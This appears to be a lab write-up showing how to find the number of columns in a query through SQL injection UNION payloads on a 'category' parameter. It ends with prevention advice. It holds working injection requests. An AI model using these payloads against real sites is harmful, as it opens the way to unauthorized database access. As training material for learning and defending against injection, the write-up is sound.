# SQL Injection UNION Attack - Determining the Number of Columns Returned by the Query

## Objective

Determine how many columns are returned by the original SQL query.

## Vulnerable Parameter

`category`

## Method

I used a UNION SELECT statement and gradually increased the number of NULL values until the query succeeded.

## Attempt 1

```http
GET /filter?category=Gifts' UNION SELECT NULL-- HTTP/2
```

Result:
- Error returned.

## Attempt 2

```http
GET /filter?category=Gifts' UNION SELECT NULL,NULL-- HTTP/2
```

Result:
- Error returned.

## Attempt 3

```http
GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/2
```

Result:
- Success.
- Page loaded normally.

## Explanation

For a UNION query to work, the number of columns in both SELECT statements must match.

The original query returns 3 columns.

The following payload succeeded:

```sql
' UNION SELECT NULL,NULL,NULL--
```

Therefore, the original query contains 3 columns.

## Why NULL Is Used

`NULL` is compatible with most data types and helps avoid datatype mismatch errors while determining the column count.

## Prevention

- Use parameterized queries.
- Avoid concatenating user input into SQL statements.
- Validate and sanitize user input.
